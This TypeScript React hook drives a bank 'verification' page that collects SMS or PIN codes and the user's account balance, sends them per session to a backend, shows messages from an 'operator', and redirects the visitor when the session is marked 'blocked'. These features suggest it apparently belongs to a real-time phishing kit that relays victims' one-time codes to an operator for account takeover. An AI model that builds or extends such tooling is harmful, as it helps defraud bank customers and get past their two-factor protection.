import { useState, useEffect, useCallback } from "react";
import { useSessionStatus } from "./use-session-status";
import { useResendCountdown } from "./use-resend-countdown";
import { submitOtp, resendOtp, submitBalance } from "../lib/bank-api";
import { debugLog } from "../lib/debug";
import { useBankVerificationConfigContext } from "../context/bank-verification-context";
import { useSessionFromStorage } from "../lib/session-storage";
import type {
  OperatorMessage,
  ResendState,
  TransactionDetails,
  VerificationLayout,
} from "../types";

const RESEND_COOLDOWN = 60;
const PIN_LENGTH = 4;
const OTP_MIN_LENGTH = 6;

function normalizeLayout(slug: string | undefined): VerificationLayout {
  if (!slug) return "sms";
  if (slug.endsWith("-sms")) return "sms";
  if (slug.endsWith("-pin")) return "pin";
  if (slug.endsWith("-push")) return "push";
  if (slug.endsWith("-balance")) return "balance";
  return "sms";
}

export interface UseBankVerificationReturn {
  layout: VerificationLayout;
  bank?: string;
  transactionDetails?: TransactionDetails;
  inProgress: boolean;
  awaitingVerification: boolean;
  error: string | null;
  onSubmit: () => void;
  submitting: boolean;
  canSubmit: boolean;
  operatorMessage: OperatorMessage | null;
  balance: string;
  onBalanceChange: (v: string) => void;
  otpValue: string;
  setOtpValue: (v: string) => void;
  wrongCode: boolean;
  expiredCode: boolean;
  resendState: ResendState;
  pinMasked: boolean;
  onPinMaskToggle: () => void;
}

export function useBankVerification(): UseBankVerificationReturn {
  const { channelSlug, debug } = useBankVerificationConfigContext();
  const { sessionId } = useSessionFromStorage(channelSlug);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [otpValue, setOtpValue] = useState("");
  const [pinMasked, setPinMasked] = useState(true);
  const [balance, setBalance] = useState("");

  const {
    status,
    verificationLayout,
    bank,
    redirectUrl,
    transactionDetails,
    wrongCode,
    expiredCode,
    clearCodeFeedback,
    operatorMessage,
    countdownResetTrigger,
    error: fetchError,
  } = useSessionStatus();

  const layout = normalizeLayout(verificationLayout);

  const resendFn = useCallback(async () => {
    if (layout === "pin" || layout === "sms") {
      debugLog(debug, "resend OTP", { type: layout });
      await resendOtp(channelSlug, sessionId ?? "", layout);
    }
  }, [channelSlug, sessionId, layout, debug]);

  const resendState = useResendCountdown(
    RESEND_COOLDOWN,
    countdownResetTrigger,
    resendFn,
  );

  useEffect(() => {
    if (wrongCode || expiredCode) {
      setSubmitting(false);
      setOtpValue("");
    }
  }, [wrongCode, expiredCode]);

  useEffect(() => {
    setSubmitting(false);
  }, [status]);

  useEffect(() => {
    if (!channelSlug || !sessionId) return;
    debugLog(debug, "status effect", { status, redirectUrl });
    if (status === "blocked" && redirectUrl) {
      debugLog(debug, "redirect", { redirectUrl });
      window.location.replace(redirectUrl);
      return;
    }
  }, [channelSlug, sessionId, status, redirectUrl, debug]);

  const handleSubmitOtp = useCallback(
    async (codeValue: string) => {
      clearCodeFeedback?.();
      setSubmitting(true);
      debugLog(debug, "submit OTP", {
        type: layout,
        codeLength: codeValue.length,
      });
      try {
        await submitOtp(channelSlug, sessionId ?? "", codeValue);
        debugLog(debug, "OTP submitted OK");
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Invalid code";
        debugLog(debug, "OTP submit failed", { error: msg });
        setSubmitError(msg);
        setSubmitting(false);
      }
    },
    [channelSlug, sessionId, clearCodeFeedback, debug, layout],
  );

  const handleSubmitBalance = useCallback(
    async (balanceValue: string) => {
      setSubmitError(null);
      setSubmitting(true);
      debugLog(debug, "submit balance", { hasValue: balanceValue.length > 0 });
      try {
        await submitBalance(channelSlug, sessionId ?? "", balanceValue);
        debugLog(debug, "balance submitted OK");
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Failed to submit balance";
        debugLog(debug, "balance submit failed", { error: msg });
        setSubmitError(msg);
        setSubmitting(false);
      }
    },
    [channelSlug, sessionId, debug],
  );

  const inProgress = status === "pending" || status === "awaiting_action";
  const awaitingVerification =
    status === "awaiting_sms" ||
    status === "awaiting_pin" ||
    status === "awaiting_push" ||
    status === "awaiting_balance";

  const onSubmit = useCallback(() => {
    if (layout === "balance") {
      handleSubmitBalance(balance);
    } else if (layout === "pin" || layout === "sms") {
      handleSubmitOtp(otpValue);
    }
  }, [layout, balance, otpValue, handleSubmitBalance, handleSubmitOtp]);

  const canSubmit =
    layout === "balance"
      ? balance.trim().length > 0
      : layout === "pin"
        ? otpValue.replace(/\D/g, "").length === PIN_LENGTH
        : otpValue.replace(/\D/g, "").length >= OTP_MIN_LENGTH;

  return {
    layout,
    bank,
    transactionDetails,
    inProgress,
    awaitingVerification,
    error: submitError ?? fetchError,
    onSubmit,
    submitting,
    canSubmit,
    operatorMessage: operatorMessage ?? null,
    balance,
    onBalanceChange: setBalance,
    otpValue,
    setOtpValue,
    wrongCode,
    expiredCode,
    resendState,
    pinMasked,
    onPinMaskToggle: () => setPinMasked((m) => !m),
  };
}
